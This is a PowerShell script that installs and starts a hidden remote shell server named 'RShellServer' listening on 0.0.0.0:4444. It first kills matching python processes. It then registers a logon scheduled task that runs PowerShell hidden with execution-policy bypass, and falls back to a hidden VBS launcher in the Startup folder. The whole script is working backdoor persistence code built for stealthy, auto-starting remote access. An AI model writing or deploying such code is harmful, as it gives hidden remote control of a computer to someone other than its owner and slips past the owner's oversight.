$ErrorActionPreference = 'Continue'

$server = Join-Path $PSScriptRoot 'run-server.ps1'

Get-CimInstance Win32_Process -Filter "Name = 'python.exe'" |
    Where-Object { $_.CommandLine -match 'server\.py' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

$taskReady = $false
try {
    $tr = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $server + '"'
    schtasks /Create /TN RShellServer /TR $tr /SC ONLOGON /F 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) {
        schtasks /Run /TN RShellServer 2>$null | Out-Null
        $taskReady = ($LASTEXITCODE -eq 0)
    }
} catch { }

if ($taskReady) {
    Write-Output '[OK] RShellServer scheduled task registered and started'
} else {
    $startup = [Environment]::GetFolderPath('Startup')
    $vbs = Join-Path $startup 'RShellServer.vbs'
    $cmdline = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "{0}"' -f $server
    $content = 'CreateObject("WScript.Shell").Run "' + $cmdline.Replace('"', '""') + '", 0, False'
    Set-Content -LiteralPath $vbs -Value $content -Encoding Unicode
    Start-Process -FilePath 'wscript.exe' -ArgumentList ('"' + $vbs + '"')
    Write-Output ('[OK] startup entry installed and started: {0}' -f $vbs)
}

Start-Sleep -Seconds 3
if (Get-NetTCPConnection -LocalPort 4444 -State Listen -ErrorAction SilentlyContinue) {
    Write-Output '[OK] server listening on 0.0.0.0:4444'
} else {
    Write-Output '[!] server not listening yet; check %TEMP%\rshell\server.log'
}
